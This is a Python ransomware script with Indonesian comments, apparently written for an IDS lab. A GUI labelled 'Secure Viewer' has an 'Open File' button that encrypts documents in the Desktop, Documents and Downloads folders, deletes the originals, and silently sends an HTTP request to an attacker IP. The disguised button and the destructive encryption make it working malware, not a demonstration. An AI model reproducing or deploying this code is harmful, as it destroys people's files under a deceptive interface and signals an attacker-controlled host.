import os
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
import requests  # Penting untuk trigger IDS

# Target direktori (Desktop, Documents, Downloads)
TARGET_DIRS = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Downloads")
]

# File ekstensi yang akan diproses
EXTENSIONS = ['.pdf', '.docx', '.xlsx', '.txt', '.pptx']

# Path penyimpanan kunci & log
KEY_PATH = os.path.expanduser("~/ransom_key.key")
LOG_PATH = os.path.expanduser("~/ransom_log.txt")

# Fungsi enkripsi
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_PATH, "wb") as f:
        f.write(key)
    return key

def encrypt_file(file_path, fernet, log_file):
    try:
        with open(file_path, "rb") as file:
            original = file.read()
        encrypted = fernet.encrypt(original)

        # Rename file menjadi .enc
        new_path = file_path + ".enc"

        with open(new_path, "wb") as file:
            file.write(encrypted)

        os.remove(file_path)
        log_file.write(f"Terenkripsi: {file_path} -> {new_path}\n")
    except Exception as e:
        log_file.write(f"❌ Gagal: {file_path} | {e}\n")

# Fungsi untuk trigger IDS dengan koneksi HTTP
def notify_attacker():
    try:
        # Ubah IP sesuai host attacker kamu
        requests.get("http://192.168.100.11:8080/attack", timeout=1)
    except:
        pass  # Jangan munculkan error agar terlihat 'silent'

def encrypt_all():
    key = generate_key()
    fernet = Fernet(key)

    with open(LOG_PATH, "w") as log_file:
        log_file.write("Log Enkripsi - Ransomware GUI\n")
        log_file.write("="*40 + "\n")

        for target_dir in TARGET_DIRS:
            for root, _, files in os.walk(target_dir):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in EXTENSIONS):
                        full_path = os.path.join(root, file)
                        encrypt_file(full_path, fernet, log_file)

    # Kirim sinyal ke IDS (biar terdeteksi)
    notify_attacker()

    messagebox.showinfo("Selesai", "File berhasil dienkripsi!\nLihat log di Desktop Anda.")

# GUI
def launch_gui():
    root = tk.Tk()
    root.title("Secure Viewer")
    root.geometry("300x200")

    label = tk.Label(root, text="Klik tombol untuk membuka file viewer.", font=("Arial", 11))
    label.pack(pady=30)

    encrypt_btn = tk.Button(root, text="Buka File", command=encrypt_all)
    encrypt_btn.pack(pady=5)

    root.mainloop()

if __name__ == "__main__":
    launch_gui()
